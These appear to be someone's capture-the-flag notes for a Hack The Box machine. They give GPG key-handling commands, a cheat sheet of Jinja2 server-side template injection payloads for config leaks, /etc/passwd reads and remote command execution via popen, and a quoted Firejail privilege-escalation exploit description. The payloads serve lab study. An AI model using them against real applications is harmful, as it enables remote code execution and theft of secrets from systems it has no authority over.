
[https://app.hackthebox.com/machines/548](https://app.hackthebox.com/machines/548 "https://app.hackthebox.com/machines/548")

```
# import keys
gpg --import private.key
gpg --decrypt fragment.asc

# generate your own key pair
gpg --full-generate-key

# list private keys
gpg --list-secret-keys
gpg --list-secret-keys --keyid-format=long

# list public keys
gpg --list-keys

# export your public key into a file. you can also use the hex string instead of email
gpg --armor --export youremail@example.com > testificate.pub.asc

# delete a key. first one is for private, second one for public
# use the 40-char hex string from `gpg --list-keys`
# you have to delete the private one first
gpg --delete-secret-key ABCDEF1234567890
gpg --delete-key ABCDEF1234567890
```

audrystralian favvo:
```sh
{{ lipsum.__globals__["os"].popen("id").read() }}
```

other:
```sh
# might leak the secret key
# if you see ('DEBUG', False), then try visiting /console
{{ config.items() }}

# arbitrary file read
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# various RCE payloads
{{ lipsum.__globals__.os.popen("id").read() }}
{{ lipsum["__globals__"]["os"]["popen"]("id")["read"]() }}

{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen("id").read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen("id").read() }}
{{ cycler.__init__.__globals__.os.popen("id").read() }}
{{ joiner.__init__.__globals__.os.popen("id").read() }}
{{ namespace.__init__.__globals__.os.popen("id").read() }}
{{ request.application.__globals__.__builtins__.__import__("os").popen("id").read() }}

# see payloadAllTheThings for filter bypasses
```
oh for context, in the above SSTI payloads, `id` can be substituted for any arbitrary shell command. im pretty sure spaces and special characters work too, unless the application does any filtering

mythical:
```sh
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.
```

https://www.openwall.com/lists/oss-security/2022/06/08/10

